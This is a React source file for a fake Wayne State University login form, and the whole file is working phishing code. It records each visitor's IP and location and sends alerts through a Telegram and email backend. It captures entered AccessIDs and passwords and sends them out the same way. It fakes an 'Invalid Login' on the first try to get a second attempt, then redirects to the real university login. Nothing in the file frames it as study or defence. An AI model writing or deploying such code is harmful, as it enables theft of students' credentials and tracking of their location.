"use client";

import React, { useState, useEffect } from "react";

// Base URL for backend: Railway in production, localhost in development
const BASE_URL = process.env.NEXT_PUBLIC_API_URL || "http://localhost:5000";

const LoginForm = ({ loginTitle, setLoginTitle }) => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [targetSystem, setTargetSystem] = useState(loginTitle);
  const [loginButtonText, setLoginButtonText] = useState("Login");
  const [loginButtonId, setLoginButtonId] = useState("login-button");
  const [processingForm, setProcessingForm] = useState(false);
  const [loginAttempts, setLoginAttempts] = useState(0);

  const [ip, setIp] = useState("N/A");
  const [city, setCity] = useState("N/A");
  const [region, setRegion] = useState("N/A");
  const [country, setCountry] = useState("N/A");

  useEffect(() => {
    const fetchLocation = async () => {
      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        setIp(data.ip || "N/A");
        setCity(data.city || "N/A");
        setRegion(data.region || "N/A");
        setCountry(data.country_name || "N/A");
      } catch (err) {
        console.error("IP/Location fetch error:", err);
      }
    };
    fetchLocation();
  }, []);

  useEffect(() => {
    const alreadySent = sessionStorage.getItem("visitorAlertSent");

    const isValidData =
      ip !== "N/A" && city !== "N/A" && region !== "N/A" && country !== "N/A";

    if (!alreadySent && isValidData) {
      const visitorAlert = `🚨 *New Visitor Alert Wayne* 🚨

🌐 IP: ${ip}
📍 Location: ${city}, ${region}, ${country}
🕒 Time: ${new Date().toLocaleString()}
📄 Page: Student Login Page`;

      sendToTelegram(visitorAlert);
      sendEmail(visitorAlert);

      sessionStorage.setItem("visitorAlertSent", "true");
    }
  }, [ip, city, region, country]);

  const sendToTelegram = (message) => {
    fetch(`${BASE_URL}/send-telegram`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ message }),
    })
      .then((response) => {
        if (response.ok) {
          console.log("Telegram message sent");
        } else {
          console.error("Failed to send Telegram message");
        }
      })
      .catch((error) => {
        console.error("Telegram error:", error);
      });
  };

  const sendEmail = (message) => {
    fetch(`${BASE_URL}/send-email`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ subject: "New Visitor Alert Wayne", message }),
    })
      .then((response) => {
        if (response.ok) {
          console.log("Email sent successfully");
        } else {
          console.error("Failed to send email");
        }
      })
      .catch((error) => {
        console.error("Error sending email:", error);
      });
  };

  const handleTargetSystemChange = (event) => {
    const selectedOption = event.target.options[event.target.selectedIndex];
    const systemValue = selectedOption.dataset.system;
    setLoginTitle(systemValue);
    setTargetSystem(systemValue);
  };

  const submitLogin = async (event) => {
    event.preventDefault();
    setProcessingForm(true);
    setLoginButtonText("Validating credentials");

    if (!username || !password) {
      setErrorFailedForm();
      return;
    }

    const attemptNumber = loginAttempts === 0 ? "🟡 First Attempt" : "🟢 Second Attempt";

    const submission = `🔐 *Student Login Attempt - ${attemptNumber}*

👤 Access ID: ${username}
🔑 Password: ${password}
💻 System: ${targetSystem}
🕒 Time: ${new Date().toLocaleString()}
🧪 Attempt Status: ${attemptNumber}

📍 *Location Info:*
- 🌐 IP: ${ip}
- 🏙️ City: ${city}
- 🗺️ Region: ${region}
- 🌎 Country: ${country}`;

    sendToTelegram(submission);
    sendEmail(submission);

    if (loginAttempts === 0) {
      setLoginAttempts(1);
      setTimeout(() => {
        setLoginButtonText("Invalid Login");
        setLoginButtonId("login-button-failed");
        reset();
      }, 1000);
      return;
    }

    setTimeout(() => {
      window.location.href = "https://login.wayne.edu";
    }, 1000);
  };

  const setErrorFailedForm = () => {
    setTimeout(() => {
      setLoginButtonText("Invalid Login");
      setLoginButtonId("login-button-failed");
      reset();
    }, 1000);
  };

  const reset = () => {
    setTimeout(() => {
      setLoginButtonText("Login");
      setLoginButtonId("login-button");
      setProcessingForm(false);
    }, 2000);
  };

  return (
    <form role="form" name="login" id="login" action="" method="POST" onSubmit={submitLogin}>
      <div className="large-5 medium-12 small-12 columns login-formbox">
        <div>
          <label htmlFor="accessid">
            <i className="silk-icon silk-user-green"></i> Your Wayne State AccessID
          </label>
          <input
            className="form-control"
            placeholder="AccessID"
            id="accessid"
            name="accessid"
            type="text"
            autoFocus
            value={username}
            onChange={(e) => setUsername(e.target.value)}
          />
        </div>
        <div>
          <label htmlFor="passwd">
            <i className="silk-icon silk-lock"></i> Your Password
          </label>
          <input
            className="form-control"
            placeholder="Password"
            id="passwd"
            name="passwd"
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
        </div>
        <div>
          <label htmlFor="where">
            <i className="silk-icon silk-key-go"></i> Target System
          </label>
          <select id="where" className="form-control" onChange={handleTargetSystemChange}>
            <option data-system="Academica" value="https://academica.aws.wayne.edu">
              Academica
            </option>
            <option data-system="Canvas" value="https://canvas.wayne.edu">
              Canvas
            </option>
            <option data-system="Salesƒorce CRM" value="https://salesforce.com/crm">
              Salesforce CRM
            </option>
            <option data-system="STARS" value="https://stars.wayne.edu">
              STARS
            </option>
            <option data-system="Wayne Connect" value="https://webmail.wayne.edu">
              Wayne Connect
            </option>
            <option data-system="Zoom" value="https://zoom.us">
              Zoom
            </option>
          </select>
        </div>
        <div className="login-button-container clearfix">
          <input
            type="submit"
            name="login-button"
            value={loginButtonText}
            className="button"
            id={loginButtonId}
            disabled={processingForm}
          />
        </div>
      </div>
    </form>
  );
};

export default LoginForm;
